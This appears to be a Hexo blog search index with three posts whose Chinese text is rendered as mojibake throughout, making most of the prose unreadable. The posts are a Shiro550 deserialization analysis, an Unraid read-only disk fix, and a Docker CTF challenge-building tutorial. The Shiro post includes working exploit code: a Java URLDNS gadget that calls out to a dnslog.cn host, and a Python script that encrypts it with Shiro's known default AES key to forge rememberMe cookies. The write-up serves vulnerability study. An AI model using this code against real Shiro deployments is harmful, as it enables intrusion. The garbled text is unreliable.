<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Shiro550æµç¨‹åˆ†æ</title>
    <url>/2024/03/20/Shiro550%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>å¥½ä¹…æ²¡å†™äº†, å†™ä¸€ä¸ªShiro550çš„åŠ å¯†åˆ†æ</p>
<p>å‚è€ƒ</p>
<blockquote>
<p><a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.788&vd_source=d3761bfc1ec1605b713147f954cd2f3c">https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.788&amp;vd_source=d3761bfc1ec1605b713147f954cd2f3c</a></p>
<p><a href="https://blog.csdn.net/xhy18634297976/article/details/122794612">https://blog.csdn.net/xhy18634297976/article/details/122794612</a></p>
</blockquote>
<p>shiroçš„å®‰è£…ç­‰æ­¥éª¤æ ¹æ®ç™½æ—¥æ¢¦ç»„é•¿çš„è§†é¢‘æ¥, è¿™é‡Œç›´æ¥åˆ†æ</p>
<p>shiro 1.2.4é¡¹ç›®ç»“æ„å¦‚ä¸‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403181953355.png" alt="image-20240318195334316"></p>
<p>ç›´æ¥ä»å¤´å®¡è®¡ä¸å¤ªå¯èƒ½, æˆ‘ä»¬æ ¹æ®shiro550çš„æ¼æ´è§¦å‘ç‚¹æ¥è‡ªCookieä¸­çš„remembermeå­—æ®µ, æˆ‘ä»¬æœç´¢é¡¹ç›®ä¸­çš„cookie</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403181953592.png" alt="image-20240318195348561"></p>
<p>æ‰¾åˆ°äº†ç¬¬äºŒä¸ªclass, è¿›å»çœ‹çœ‹ç»“æ„å’Œæ–¹æ³•, å¹¶å¤§è‡´çœ‹ä¸€é, å¯ä»¥æ‰¾åˆ°å…¶ä¸­æ¯”è¾ƒå…³é”®çš„<code>rememberSerializedIdentity</code>å’Œ<code>getRememberedSerializedIdentity</code>è¿™ä¸¤ä¸ªæ–¹æ³•, å‰ä¸€ä¸ªå°†æ•°æ®è¿›è¡Œäº†base64å¹¶èµ‹ç»™cookie , å¦ä¸€ä¸ªåˆ™æ˜¯ä»cookieä¸­å–å‡ºæ•°æ®å¹¶base64è§£ç </p>
<p>æˆ‘ä»¬éœ€è¦çŸ¥é“base64ä¸Šä¸€æ­¥æ˜¯ä»€ä¹ˆ, æ‰€ä»¥æˆ‘ä»¬å‘ä¸ŠæŸ¥æ‰¾<code>rememberSerializedIdentity</code>çš„ç”¨æ³•, ä¹Ÿå°±æ˜¯å“ªé‡Œè°ƒç”¨äº†å®ƒ, æ‰¾åˆ°äº†<code>rememberIdentity</code>æ–¹æ³•, ç»§ç»­æŸ¥æ‰¾ç”¨æ³•æ‰¾åˆ°å¦ä¸€ä¸ªé‡è½½çš„<code>rememberIdentity</code>æ–¹æ³•ä¸­, é‡Œé¢è°ƒç”¨<code>getPrincipals</code>æ–¹æ³•ç»™<code>principals</code>èµ‹äº†å€¼</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321941.png" alt="image-20240318200424398"></p>
<p>â€‹								<code>rememberIdentity</code>æ–¹æ³•</p>
<blockquote>
<p>principalsèº«ä»½ï¼Œå³ä¸»ä½“çš„æ ‡è¯†å±æ€§, è¿™é‡Œåº”è¯¥è¡¨ç¤ºçš„å°±æ˜¯cookieä¸­å­˜æ”¾çš„èº«ä»½è¯†åˆ«</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321737.png" alt="image-20240318202016986"></p>
<p>â€‹								é‡è½½çš„<code>rememberIdentity</code>æ–¹æ³•</p>
<p>ç»§ç»­å‘ä¸ŠæŸ¥æ‰¾, åœ¨<code>onSuccessfulLogin</code>ä¸­è°ƒç”¨äº†<code>rememberIdentity</code>, å¦‚æœ<code>isRememberMe(token)</code>æˆç«‹, åˆ™ç»§ç»­è°ƒç”¨, è¿™é‡Œåˆ¤æ–­çš„å°±æ˜¯æ˜¯å¦é€‰æ‹©äº†remenberme, ä¹‹åå°±ä¼šæŒ‰ç…§ä¸Šé¢å€’è¿‡æ¥çš„é¡ºåºä¸€æ­¥æ­¥è¿›å…¥åºåˆ—åŒ–</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321825.png" alt="image-20240318204741159"></p>
<p>æ‘¸æ¸…æ¥šè°ƒç”¨é¡ºåºå, æˆ‘ä»¬å›è¿‡å¤´æ¥åœ¨å¯»æ‰¾å…¶ä¸­çš„åŠ å¯†çš„åœ°æ–¹</p>
<p>è·Ÿè¿›<code>rememberIdentity</code>ä¸­çš„<code>convertPrincipalsToBytes</code>, è¿™ä¸ªæ–¹æ³•å°†èº«ä»½è®¤è¯åºåˆ—åŒ–åè¿›è¡Œäº†åŠ å¯†<code>getCipherService</code>æœ€åæŒ‡å‘äº†<code>AbstractRememberMeManager</code>ç±»çš„æ„é€ å‡½æ•°, åœ¨é‡Œé¢å¯¹<code>cipherService</code>èµ‹å€¼äº†<code>AesCipherService</code></p>
<p><code>AesCipherService</code>ç±»é‡Œé¢æœ‰ä¸€äº›aesåŠ å¯†çš„å‚æ•°, å¯ä»¥çŒœæµ‹shiroçš„åŠ å¯†æ–¹å¼æ˜¯å°†è®¤è¯åºåˆ—åŒ–åè¿›è¡Œäº†aesåŠ å¯†, æœ€åbase64ä¸€ä¸‹æ”¾åœ¨äº†cookieä¸­, åé¢éªŒè¯çŒœæƒ³æ­£ç¡®</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321797.png" alt="image-20240318200759805"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321480.png" alt="image-20240318211725384"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321458.png" alt="image-20240318201006869"></p>
<p>çœ‹å®Œæ¡ä»¶, ç»§ç»­è·Ÿè¿›<code>encrypt</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321755.png" alt="image-20240318201327066"></p>
<p>é‡ç‚¹çœ‹è¿™ä¸€å¥, ç¬¬äºŒä¸ªå‚æ•°æ˜æ˜¾æ˜¯åŠ å¯†çš„å¯†é’¥</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.encrypt(serialized, getEncryptionCipherKey());</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒä¸ªå‚æ•°é‡ç‚¹å…³æ³¨, æˆ‘ä»¬è·Ÿè¿›å»å‘ç°æ˜¯ä¸€ä¸ªè¿”å›çš„å˜é‡, æŸ¥æ‰¾ç”¨æ³•, åœ¨å†™å…¥é‡Œé¢å‘ç°äº†å¯¹å…¶èµ‹å€¼çš„<code>setEncryptionCipherKey</code>æ–¹æ³•, ç»§ç»­æŸ¥æ‰¾ç”¨æ³•æ‰¾åˆ°<code>setCipherKey</code>æ–¹æ³•, ç»§ç»­æŸ¥æ‰¾, æœ€ç»ˆæ‰¾åˆ°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br></pre></td></tr></table></figure>

<p>è€Œè¿™ä¸ª<code>DEFAULT_CIPHER_KEY_BYTES</code>æ˜¯ä¸€ä¸ªå¸¸é‡<br><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182125401.png" alt="image-20240318212506366"></p>
<p>æœ€åå…³æ³¨<code>encrept</code>æ–¹æ³•, æˆ‘ç‚¹å‡»è¿›å»å‘ç°æ˜¯ä¸ªæ¥å£, çœ‹ä¸äº†å…·ä½“æ–¹æ³•, æ‰€ä»¥å¼€äº†è°ƒè¯•, è¿™æ ·å°±å¯ä»¥è·Ÿè¿›äº†, è¿›å…¥<code>JcaCipherService</code>ç±», ä»£ç å¦‚ä¸‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321030.png" alt="image-20240318213056726"></p>
<p>ivåœ¨aesåŠ å¯†ä¸­æ˜¯åˆå§‹å‘é‡, ä¸€èˆ¬æ˜¯éšæœºç”Ÿæˆ, è¿™é‡Œè·Ÿè¿›æœ€åå¾—åˆ°ivBytesçš„ç”Ÿæˆä¸ºä¸€ä¸ªéšæœºæ•°</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321571.png" alt="image-20240318213719957"></p>
<p>æœ€åå¾—åˆ°ä¸€ä¸ª16ä½é•¿çš„æ•°ç»„</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321682.png" alt="image-20240318213829744"></p>
<p>ä¸€ç›´è·Ÿè¿›, å¯ä»¥å¾—åˆ°åŠ å¯†ç±»å‹, ç¡®å®æ˜¯AESåŠ å¯†, ä½¿ç”¨ivä½œä¸ºåˆå§‹å‘é‡, CBCæ–¹æ³•</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321602.png" alt="image-20240318214212833"></p>
<p>å‚æ•°å·²çŸ¥, åŠ å¯†ç®—æ³•å·²çŸ¥, å‰©ä¸‹çš„å°±æ˜¯å¤åˆ»ä¸€ä¸ªç®—æ³•äº†</p>
<blockquote>
<p>è¿™é‡Œè¡¥å……ä¸€å˜´, ivä½œä¸ºéšæœºæ•°, æ¯æ¬¡çš„å€¼éƒ½ä¸æ˜¯ä¸€æ ·çš„, é‚£ä¹ˆè§£å¯†è¿‡ç¨‹åº”è¯¥ç”¨ä¸åˆ°iv</p>
</blockquote>
<p>ç„¶åæ³¨æ„ä¸€ä¸‹, shiroä¸­çš„åŠ å¯†ä¸æ˜¯å•çº¯çš„aesåŠ å¯†, åœ¨<code>encrypt</code>æ–¹æ³•ä¸­, æˆ‘ä»¬å¯ä»¥å‘ç°å…¶è¿”å›ç»“æœä¸æ­¢æ˜¯åŠ å¯†åçš„å¯†æ–‡, è¿˜åŒ…æ‹¬äº†16ä½çš„iv, ä¹Ÿå°±æ˜¯<code>base64(iv+encrypted)</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2024-03/202403182321378.png" alt="image-20240318221243193"></p>
<p>è¿™æ ·çš„è¯, æˆ‘ä»¬å¯¹ä¸€èˆ¬çš„aesåŠ å¯†ç¨‹åºåšä¸€ä¸‹ä¿®æ”¹, åœ¨base64é‡Œé¢çš„å‰é¢å¤šåŠ ä¸€ä¸ªivå°±è¡Œäº†(å› ä¸ºivçš„å€¼ä¼šè¢«å»æ‰, ç•™ä¸‹åé¢çš„é‚£éƒ¨åˆ†è¿›å»aesçš„è§£å¯†)</p>
<p>æˆ‘å°è¯•äº†åŠ å…¥16ä½çš„å…¶ä»–æ•°æ®, åˆ©ç”¨å¤±è´¥äº†, è¯´æ˜è¿˜æ˜¯ä¼šæ£€æµ‹ä¸€ä¸‹å‰é¢16ä½å’Œivçš„å¯¹åº”å…³ç³»</p>
<p>ä½¿ç”¨urldnsçš„é“¾å­æ‰“ä¸€ä¸‹</p>
<p>ç”Ÿæˆååºåˆ—åŒ–æ•°æ®</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS_exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://6ccnx1.dnslog.cn&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> url.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url, <span class="number">1234</span>);</span><br><span class="line">        hashMap.put(url, <span class="number">1</span>);</span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line"><span class="comment">//        unserialize(&quot;url.ser&quot;);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;url.ser&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯¹æ•°æ®åŠ å¯†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_key</span>():</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    fake = <span class="string">b&#x27;a&#x27;</span> * <span class="number">16</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(fake))</span><br><span class="line">    key = base64.b64decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class="line">    cipher = AES.new(key, mode, iv)</span><br><span class="line">    ciphertext = base64.b64encode(iv + cipher.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext  <span class="comment"># è¿”å›å¯†æ–‡</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    plaintext = <span class="string">b&quot;HelloAES&quot;</span>  <span class="comment"># å¾…åŠ å¯†çš„æ˜æ–‡</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\ctf\\web_tools\\2_JAVA_tools\\Yso_src\\ysoserial\\url.ser&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        text = f.read()</span><br><span class="line">    encdata = encrypt(text)</span><br><span class="line">    <span class="built_in">print</span>(encdata)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ²¡æ‰“cbé“¾å­, ä¸»è¦æ˜¯æˆ‘è¿˜æ²¡å­¦, å¯ä»¥ç”¨æ¥æ£€æµ‹æ˜¯å¦å­˜åœ¨shiro550</p>
<p>æ€»ç»“ä¸‹æ¥ç”¨åˆ°çš„åªæœ‰åŠ å¯†å’Œè§£å¯†çš„åˆ†æ, ååºåˆ—åŒ–å…¥å£å°±åœ¨<code>Deserializatie</code>é‚£é‡Œ, åç»­å°±æ˜¯å¸¸è§„ååºåˆ—åŒ–é“¾å­, æ¯”ccé“¾åˆ†æéƒ½ç®€å•</p>
]]></content>
      <tags>
        <tag>Java</tag>
        <tag>Safety</tag>
      </tags>
  </entry>
  <entry>
    <title>Unraidç›˜ç¬¦çš„åªè¯»é—®é¢˜ä¿®å¤</title>
    <url>/2023/09/28/unraid%E7%9B%98%E7%AC%A6%E5%8F%AA%E8%AF%BB%E4%BA%8B%E4%BB%B6/</url>
    <content><![CDATA[<p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯unraidçš„é—®é¢˜, å°±å»æ‰¾unraidç›¸å…³çš„å¸–å­çœ‹çœ‹æœ‰æ²¡æœ‰è§£å†³åŠæ³•</p>
<p>ä½†æ˜¯å¹¶æ²¡æœ‰, è¿™è®©æˆ‘å¾ˆå¤´ç–¼, äºæ˜¯å…ˆå¼€äº†unraidçš„å‘½ä»¤è¡Œçœ‹ä¸€ä¸‹æƒ…å†µ</p>
<p>df -hçœ‹èµ·æ¥æ²¡å•¥é—®é¢˜ (å›¾ç‰‡æ˜¯åæ¥ä¿®å¥½äº†ä¹‹åæ‰æˆªçš„, ä¸è¿‡å¤ç°ä¹Ÿå¾ˆç®€å•å°±ä¸èŠ‚å¤–ç”Ÿæäº†)</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309260732559.png" alt="image-20230926073216523"></p>
<p>mountæŸ¥çœ‹ä¸€ä¸‹æŒ‚è½½æƒ…å†µ</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309260733970.png" alt="image-20230926073332944"></p>
<p>åœ¨è¿™é‡Œèƒ½çœ‹åˆ°æŒ‚è½½æƒ…å†µæ˜¯ro (å›¾åŒä¸Š, æŠŠrwçœ‹æˆroå°±å¯ä»¥)</p>
<p>æˆ‘ä»¬unmountä¸€ä¸‹å†é‡æ–°æŒ‚è½½çœ‹çœ‹</p>
<p>æ²¡æœ‰unmountå‘½ä»¤, åŠ ä¸Šunraidè¿™ä¸ªç³»ç»Ÿæ²¡æ‰¾åˆ°åŒ…ç®¡ç†å™¨, æƒ³åˆ«çš„åŠæ³•</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309260734374.png" alt="image-20230926073439349"></p>
<p>å› ä¸ºå†webuié‡Œé¢æœ‰unmount, å°±ç›´æ¥ç”¨äº†</p>
<p>ä¹‹åä½¿ç”¨<code>mount /dev/nvme0n1p3 /mnt/disks/ZTA21T0KA230550818-part3</code>æ‰‹åŠ¨æŒ‚è½½</p>
<p>æŠ¥é”™, æ˜¾ç¤ºwindowsçš„ç¼“å­˜è¿˜åœ¨ (å›¾ç‰‡å¼•ç”¨äº†åˆ«äººçš„, æˆ‘å¿˜è®°æˆªå›¾äº†)</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309260737776.png" alt="image-20230926073727753"></p>
<p>å¦å¤–æŸ¥çœ‹è¿™å—ç›˜ä¸Šçš„å†…å®¹å¯ä»¥å‘ç°æœ‰ä¸ª132gçš„hiberfile.sys, è¿™ä¸œè¥¿å°±æ˜¯windowsçš„ä¼‘çœ æ–‡ä»¶, æ ¹æ®å·²æœ‰ä¿¡æ¯, åˆ¤æ–­windowsè‡ªåŠ¨ä¿®å¤çš„æ—¶å€™æŠŠå¿«é€Ÿå¯åŠ¨é€‰é¡¹ç»™é‡æ–°å¼€å¯äº†, æ‰€ä»¥æ‰ä¼šç”Ÿæˆè¿™ç§æ–‡ä»¶</p>
<p>è¯•äº†å‡ ç§æ–¹æ³•, æˆ‘è¿™é‡Œå¯åŠ¨è¿™å—ç›˜ä¸Šçš„windows, å…³é—­å¿«é€Ÿå¯åŠ¨åè¿˜æ˜¯åªè¯», äºæ˜¯å†æ¬¡å¼€å¯windowså‘ç°hiberfile.sysè¿˜åœ¨, äºæ˜¯ä½¿ç”¨</p>
<p><code>powercfg -h off</code> å‘½ä»¤å½»åº•å…³é—­, æŸ¥çœ‹ç£ç›˜å‘ç°hiberfileæ–‡ä»¶å·²åˆ é™¤</p>
<p>é‡æ–°å¯åŠ¨, é—®é¢˜è§£å†³</p>
<p>è¿™é‡Œæˆ‘å…¶å®ä¹Ÿè¯•äº†<code>sudo ntfs-3g -o remove_hiberfile /dev/nvme0n1p3 /mnt/disks/ZTA21T0KA230550818-part3</code></p>
<p>ä¸è¿‡æ— æ³•æŒ‚è½½, æ‰€ä»¥æ‰æ‰¾äº†åˆ«çš„æ–¹æ³•</p>
]]></content>
      <tags>
        <tag>Unraid</tag>
        <tag>è¿ç»´</tag>
      </tags>
  </entry>
  <entry>
    <title>å‡ºé¢˜æ•™ç¨‹</title>
    <url>/2023/09/28/%E5%87%BA%E9%A2%98%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>webçš„é¢˜ç›®æŒ‰ç…§dockeræ¥æ„å»ºé•œåƒ</p>
<p>ä¸€èˆ¬æ¥è¯´éœ€è¦ä¸¤ä¸ªæ–‡ä»¶, ä½†æ˜¯å½“åªéœ€è¦æ‹‰å–åˆ«äººåˆ¶ä½œå¥½çš„é•œåƒçš„æ—¶å€™å…¶å®åªéœ€è¦docker-compose.yml</p>
<p>docker-compose.ymlå’ŒDockerfile</p>
<p>ä¸‹é¢æ˜¯ä¸¤ä¸ªæ˜¯ç®€å•ç¤ºä¾‹</p>
<h3 id="é¢˜ç›®ç»“æ„"><a href="#é¢˜ç›®ç»“æ„" class="headerlink" title="é¢˜ç›®ç»“æ„"></a>é¢˜ç›®ç»“æ„</h3><p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309230120067.png" alt="image-20230909133516054"></p>
<h2 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker-compose.yml</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">web_multi</span></span><br><span class="line">    <span class="comment"># å½“buildå’ŒimageåŒæ—¶å‡ºç°æ—¶, ä¼šæŠŠimageå½“æˆè¿™ä¸ªé•œåƒçš„åç§°</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8080:80&quot;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">FLAG=flag&#123;test_flag&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx:alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> 1.html /usr/share/nginx/html/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">80</span></span><br><span class="line"><span class="comment">#nginxç‰ˆæœ¬</span></span><br></pre></td></tr></table></figure>

<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">7.2</span>-apache</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src /var/www/html</span></span><br><span class="line"><span class="comment">#ä¼šæŠŠsrcç›®å½•ä¸‹çš„æ–‡ä»¶å…¨éƒ¨å¤åˆ¶è¿‡å», ä¸æ˜¯å¤åˆ¶srcæ–‡ä»¶å¤¹</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag.sh /flag.sh</span></span><br><span class="line"><span class="comment">#æŠŠå½“å‰ç›®å½•ä¸‹çš„flag.shå¤åˆ¶åˆ°æ ¹ç›®å½•ä¸‹</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /flag.sh</span></span><br><span class="line"><span class="comment">#apacheç‰ˆæœ¬</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>è¿™æ ·ä¸€é“æœ€ç®€å•çš„çº¯htmlé¢˜ç›®å°±æ­å»ºå¥½äº†</p>
<p>å¦‚æœéœ€è¦åŠ å…¥php, åˆ™éœ€è¦åœ¨Dockerfileé‡Œé¢æ‹‰å–phpçš„é•œåƒå¹¶æ„å»º</p>
<blockquote>
<p>æ¯”å¦‚FROM php:5.6-fpm-alpine</p>
<p>æˆ–è€…æ˜¯FROM ctfhub&#x2F;base_web_nginx_php_74</p>
<p>æˆ–è€…ctftraining&#x2F;base_image_nginx_mysql_php_73</p>
</blockquote>
<p>è¿˜å¯ä»¥åŠ å…¥flag.shåˆå§‹åŒ–è„šæœ¬</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$FLAG</span> &gt; /flag <span class="comment"># å°†flagå†™å…¥æ ¹ç›®å½•</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> FLAG=not_flag</span><br><span class="line">FLAG=not_flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -f /flag.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">sed -i <span class="string">&#x27;s/flag&#123;test&#125;/$FLAG/&#x27;</span> /var/www/html/flag.php <span class="comment"># å°†flagå†™å…¥æ ¹ç›®å½•</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> FLAG=not_flag</span><br><span class="line">FLAG=not_flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -f /flag.sh</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸ªå‘, ä¸€å®šè¦ç”¨\rä¹Ÿå°±æ˜¯å›è½¦æ‰è¡Œ, è€Œå›è½¦åœ¨linuxä¸­æ˜¯\n, åœ¨windowsä¸­å¼\r\n, linuxä¸è®¤è¯†\r, æ•…flag.shä¼šæŠ¥é”™ä¸èƒ½æ‰§è¡Œ</p>
<p><img src="https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202309230120521.png" alt="image-20230909202502167"></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">webapp</span><br><span class="line">â”œâ”€â”€ docker-compose.yml</span><br><span class="line">â”œâ”€â”€ Dockerfile</span><br><span class="line">â”œâ”€â”€ start.sh</span><br><span class="line">â””â”€â”€ src</span><br><span class="line">    â””â”€â”€ index.php</span><br></pre></td></tr></table></figure>

<ol>
<li>sed -i åé¢ä¸€å®šè·Ÿç€åŒå¼•å·, å•å¼•å·æ˜¯ä¼šè¢«å½“æˆå­—ç¬¦ä¸²</li>
</ol>
<p>æˆ‘çš„å®ç°æ–¹æ¡ˆæ˜¯</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#docker-compose.yml</span></span><br><span class="line"><span class="attr">version:</span> <span class="string">&quot;3&quot;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">web:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nanamo/web_multi</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;8080:80&quot;</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">FLAG=flag&#123;test_flag&#125;</span></span><br></pre></td></tr></table></figure>

